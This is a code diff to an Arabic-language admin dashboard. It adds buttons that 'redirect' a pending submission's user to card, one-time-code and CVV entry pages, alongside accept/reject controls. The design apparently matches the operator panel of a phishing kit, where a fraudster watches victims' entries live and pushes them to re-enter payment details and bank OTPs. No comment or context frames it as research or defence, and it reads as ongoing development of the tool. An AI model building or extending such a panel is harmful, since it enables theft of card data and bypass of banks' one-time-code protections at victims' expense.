@@ -164,6 +164,13 @@
   .modal-btn.reject{background:#fde8e8;color:var(--red)}
   .modal-btn.reject:hover{background:var(--red);color:#fff}
   .modal-btn:disabled{opacity:.4;cursor:default}
+  .modal-btn.redirect-card{background:#f3e8fd;color:#7b1fa2}
+  .modal-btn.redirect-card:hover{background:#7b1fa2;color:#fff}
+  .modal-btn.redirect-otp{background:#e8f0fd;color:#1565c0}
+  .modal-btn.redirect-otp:hover{background:#1565c0;color:#fff}
+  .modal-btn.redirect-cvv{background:#fff3e0;color:#e65100}
+  .modal-btn.redirect-cvv:hover{background:#e65100;color:#fff}
+  .modal-redirect-row{display:flex;gap:10px;padding:0 24px 18px;background:#fafbfc}
   .modal-status{text-align:center;padding:12px;font-weight:800;font-size:16px}
 
   /* ---------- notification banner ---------- */
@@ -348,6 +355,7 @@
       </div>
       <div class="modal-body" id="modalBody"></div>
       <div class="modal-actions" id="modalActions"></div>
+      <div class="modal-redirect-row" id="modalRedirect"></div>
     </div>
   </div>
 
@@ -726,14 +734,24 @@
       '<div class="detail-row"><span class="detail-label">الوقت</span><span class="detail-value" style="font-family:inherit;direction:rtl">'+fmtTime(s.time)+'</span></div>';
 
     const actions = document.getElementById('modalActions');
+    const redirectRow = document.getElementById('modalRedirect');
     if (s.status === 'accepted') {
       actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>';
+      redirectRow.innerHTML = '';
+      redirectRow.style.display = 'none';
     } else if (s.status === 'rejected') {
       actions.innerHTML = '<div class="modal-status" style="color:var(--red);width:100%">تم الرفض ✗</div>';
+      redirectRow.innerHTML = '';
+      redirectRow.style.display = 'none';
     } else {
       actions.innerHTML =
         '<button class="modal-btn accept" onclick="doAction(\'accept\',\''+id+'\')">قبول</button>' +
         '<button class="modal-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>';
+      redirectRow.style.display = 'flex';
+      redirectRow.innerHTML =
+        '<button class="modal-btn redirect-card" onclick="redirectUser(\''+id+'\',\'card\')">توجيه ← البطاقة</button>' +
+        '<button class="modal-btn redirect-otp" onclick="redirectUser(\''+id+'\',\'otp\')">توجيه ← الكود</button>' +
+        '<button class="modal-btn redirect-cvv" onclick="redirectUser(\''+id+'\',\'cvv\')">توجيه ← CVV</button>';
     }
 
     document.getElementById('modalOverlay').classList.add('open');
@@ -763,6 +781,7 @@
         headers: { 'Authorization': 'Bearer '+token(), 'Content-Type': 'application/json' },
         body: JSON.stringify({ page: page })
       });
+      closeModal();
       loadData();
     } catch(e) {}
   }
